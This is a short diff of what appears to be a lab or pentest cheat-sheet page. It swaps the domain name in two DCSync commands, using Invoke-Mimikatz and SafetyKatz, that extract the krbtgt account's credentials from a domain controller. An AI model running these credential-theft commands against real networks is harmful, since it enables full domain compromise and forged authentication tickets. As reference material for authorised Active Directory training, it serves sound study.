@@ -4,8 +4,8 @@
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
 
-SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 {% endcode %}
